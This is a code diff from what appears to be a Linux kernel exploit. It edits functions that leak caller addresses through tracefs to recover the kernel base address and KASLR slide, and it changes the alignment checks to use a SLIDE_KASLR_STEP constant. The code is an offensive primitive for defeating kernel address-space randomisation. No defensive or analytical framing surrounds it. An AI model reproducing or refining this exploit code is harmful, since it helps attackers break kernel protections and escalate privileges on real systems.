@@ -60,7 +60,8 @@ static int slide_tracefs_parse_page(
           KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
       if (caller >= link_caller) {
         uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+        if (candidate <= 0x1f0000ULL &&
+            (candidate & (SLIDE_KASLR_STEP - 1)) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
@@ -127,10 +128,13 @@ static int slide_tracefs_leak_kernel_base(void) {
   kaslr_base = KIMAGE_TEXT_BASE + candidate;
   kaslr_slide = candidate;
   kaslr_done = 1;
+  data_addr_canonical = 1;
+  app_publish_slide_ready();
   pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
-             "slide=%016llx p0_offset=%08zx\n",
+             "slide=%016llx data_mode=%s\n",
              getpid(), (unsigned long long)kaslr_base,
-             (unsigned long long)kaslr_slide, slide_p0_offset);
+             (unsigned long long)kaslr_slide,
+             "canonical");
   return 1;
 }
 
@@ -141,7 +145,7 @@ int slide_leak_kernel_base(void) {
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
     if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+        (value & (SLIDE_KASLR_STEP - 1)) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
